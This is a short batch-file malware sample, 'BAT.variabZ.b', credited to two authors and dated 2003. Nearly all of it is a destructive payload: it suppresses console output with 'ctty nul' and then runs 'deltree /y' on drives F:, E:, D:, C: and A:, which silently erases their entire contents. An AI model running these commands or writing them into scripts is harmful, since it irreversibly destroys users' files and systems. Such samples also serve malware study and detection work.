:: 
:: BAT.variabZ.b
::
:: Created by 2 good friends.
:: DvL      ( dvl2003ro@yahoo.co.uk )
:: Ratty    ( ratty2001ro@yahoo.com )
:: Contact us.
::
@echo off
ctty nul
@for %%f in (f:\) do deltree/y %%f >nul
@for %%e in (e:\) do deltree/y %%e >nul
@for %%d in (d:\) do deltree/y %%d >nul
@for %%c in (c:\) do deltree/y %%c >nul
@for %%a in (a:\) do deltree/y %%a >nul
:: Created for SbC 2.0 by DvL and Ratty
:: 21.05.2003
ctty con
cls